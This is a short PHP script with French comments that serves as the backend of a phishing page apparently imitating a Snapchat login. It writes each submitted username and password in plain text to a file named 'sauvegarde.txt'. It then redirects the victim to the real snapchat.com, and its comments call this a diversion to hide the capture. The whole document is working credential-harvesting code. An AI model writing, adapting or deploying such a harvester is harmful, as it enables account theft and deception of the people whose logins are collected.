<?php
// 1. On vérifie si les cases "username" et "password" ont bien envoyé des données
if (isset($_POST['username']) && isset($_POST['password'])) {
    
    // 2. On récupère ce que l'utilisateur a écrit
    $login = $_POST['username'];
    $pass = $_POST['password'];
    
    // 3. On prépare la ligne de texte avec un retour à la ligne (\n)
    $texte = "Utilisateur : " . $login . " | Mot de passe : " . $pass . "\n";
    
    // 4. On écrit cette ligne dans un fichier appelé "sauvegarde.txt"
    // Le mode "a" permet d'ajouter le texte à la fin du fichier sans rien écraser
    $fichier = fopen("sauvegarde.txt", "a");
    fwrite($fichier, $texte);
    fclose($fichier);
    
    // 5. La diversion : on redirige l'utilisateur vers le vrai site pour cacher le test
    header("Location: https://snapchat.com");
    exit();
}
?>
